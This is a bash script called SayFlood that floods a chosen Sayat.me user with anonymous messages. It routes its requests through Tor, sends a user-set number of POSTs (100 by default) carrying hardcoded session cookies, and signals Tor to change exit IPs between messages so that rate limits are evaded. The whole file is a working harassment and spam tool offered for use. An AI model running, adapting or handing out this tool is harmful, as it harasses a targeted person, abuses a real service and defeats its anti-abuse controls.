#!/bin/bash
# SayFlood v1.0
# Author: https://github.com/thelinuxchoice/sayflood

banner() {

printf "\n"                                                
printf "\e[1;77m  ____              _____ _                 _  \n"
printf " / ___|  __ _ _   _|  ___| | ___   ___   __| | \n"
printf " \___ \ / _\` | | | | |_  | |/ _ \ / _ \ / _\` | \n"
printf "  ___) | (_| | |_| |  _| | | (_) | (_) | (_| | \n"
printf " |____/ \__,_|\__, |_|   |_|\___/ \___/ \__,_| \n"
printf "              |___/\e[0m                            \n"
printf "\e[1;92m  Author: github.com/thelinuxchoice/sayflood\e[0m\n"
printf "\e[1;77m  @linux_choice\n\e[0m"
printf "\n"
}

checktor() {

checktor=$(curl -s --socks5-hostname localhost:9050 "https://check.torproject.org" > /dev/null; echo $?)

if [[ $checktor -gt 0 ]]; then
printf "\e[1;93m[!] It Requires Tor! Please, install it or check your TOR connection!\e[0m\n"
exit 1
fi

}


start() {

read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Sayat.me Username: ' username
checkuser=$(curl -s -i https://sayat.me/$username -L | grep -o 'The selected page was not found')

if [[ $checkuser == *'The selected page was not found'* ]]; then
printf "\e[1;93m[!] User Not Found, try again!\e[0m\n"
sleep 1
start
fi

IFS=$'\n'
default_amount="100"
default_message="sorry the flood"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Message: ' message
message="${message:-${default_message}}"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Amount message (Default: 100): ' amount
amount="${amount:-${default_amount}}"


for i in $(seq 1 $amount); do

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Sending message:\e[0m\e[1;93m %s\e[0m\e[1;77m/\e[0m\e[1;93m%s ...\e[0m" $i $amount
IFS=$'\n'
send=$(curl --socks5 localhost:9050 -i -s -k  -X $'POST'     -H $'Host: sayat.me' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://sayat.me/'$username'' -H $'Cookie: __cfduid=dad12d6fa33da4469e4b16501ec0f535c1536089141; csam=5c2b178255; language=en; guid=%7BE5703EDD-EC59-78BC-4DBB-5C570E58E6DC%7D; last_activity=1536091759; _ga=GA1.2.1723360848.1536089156; _gid=GA1.2.811908030.1536089156; trc_cookie_storage=taboola%2520global%253Auser-id%3D67168056-f87a-40d5-846f-b0f0a546bd22-tuct2886117; PHPSESSID=rs933ps8nirenskvr9va6lb232' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Type: application/x-www-form-urlencoded'  -b $'__cfduid=dad12d6fa33da4469e4b16501ec0f535c1536089141; csam=5c2b178255; language=en; guid=%7BE5703EDD-EC59-78BC-4DBB-5C570E58E6DC%7D; last_activity=1536091759; _ga=GA1.2.1723360848.1536089156; _gid=GA1.2.811908030.1536089156; trc_cookie_storage=taboola%2520global%253Auser-id%3D67168056-f87a-40d5-846f-b0f0a546bd22-tuct2886117; PHPSESSID=rs933ps8nirenskvr9va6lb232'     --data-binary $'write='$message'&gif=&giphy=&more_feedback_input=&foo=C8MQzISSm05kdk8&bar=OXoBdGhDcGpqVAkMUl1SAQ%3D%3D&url=&password=&password_confirm=&signup=0&url_login=&password_login=&login=0&csam=5c2b178255'     $'https://sayat.me/'$username'' | grep 'HTTP/2 200'; echo $?)

if [[ $send == "1" ]]; then
printf "\e[1;93m Fail\n\e[0m"
else
printf "\e[1;92m Done\n\e[0m"
fi
killall -HUP tor > /dev/null 2>&1
sleep 1
done
rm -rf temp_user
exit 1
}
banner
checktor
start

